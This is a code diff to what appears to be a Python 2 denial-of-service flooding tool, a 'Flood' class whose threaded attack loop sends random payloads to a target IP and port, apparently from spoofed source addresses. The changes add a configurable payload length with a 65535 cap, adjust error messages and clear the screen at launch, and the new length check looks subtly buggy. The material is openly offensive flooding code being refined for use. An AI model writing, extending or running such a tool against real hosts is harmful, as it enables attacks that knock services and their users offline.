@@ -31,7 +31,7 @@ class Flood:
 	def cls(self):
 	    os.system('cls' if os.name == 'nt' else 'clear')
 
-	def attack(self, args, dstUrl, dstIp, dstPort, multiplier, threads):
+	def attack(self, args, dstUrl, dstIp, dstPort, multiplier, threads, payloadLen):
 		#attack loop
 		while 1:
 
@@ -64,7 +64,7 @@ class Flood:
 			if args.verbose is True:print '[!] Attacking %s on port %s from %s using source port %s' % (dstIp, dstPort, srcIp, srcPort)
 
 
-			payload = ''.join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') for r in range(int(multiplier)))
+			payload = ''.join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') for r in range(int(payloadLen)))
 
 			#threaded jobs list
 			jobs = []
@@ -140,7 +140,15 @@ def main():
 	if args.length is None:
 		length = 10
 	else:
-		length = int(''.join(args.length))
+		if int(''.join(args.length)) > 65535:
+			print '\n [!] Payload must be under 65535\n'
+			parser.print_help()
+			sys.exit()
+		
+		if args.length <= 65535:
+			length = int(''.join(args.length))
+
+
 
 
 	#if ipdst was entered, check if a valid IP
@@ -149,7 +157,7 @@ def main():
 			try:
 				socket.inet_aton(a)
 			except socket.error:
-				print '[-] Invalid IP address entered: ' + a
+				print '\n [-] Invalid IP address entered: ' + a + '\n'
 				sys.exit()
 		
 
@@ -157,17 +165,20 @@ def main():
 	dstPort = ''.join(args.port)
 	dstUrl = ''.join(args.url)
 	multiplier = ''.join(args.multiplier)
+	payloadLen = ''.join(args.length)
 
 
 	sendattack = Flood()
 	sendattack.cls()
 	#sendattack.timer(dstUrl, dstIp)
-	sendattack.attack(args, dstUrl, dstIp, dstPort, multiplier, threads)
+	sendattack.attack(args, dstUrl, dstIp, dstPort, multiplier, threads, payloadLen)
 
 
 
 
 if __name__ == '__main__':
+	
+	os.system('cls' if os.name == 'nt' else 'clear')
 	main()
 
 
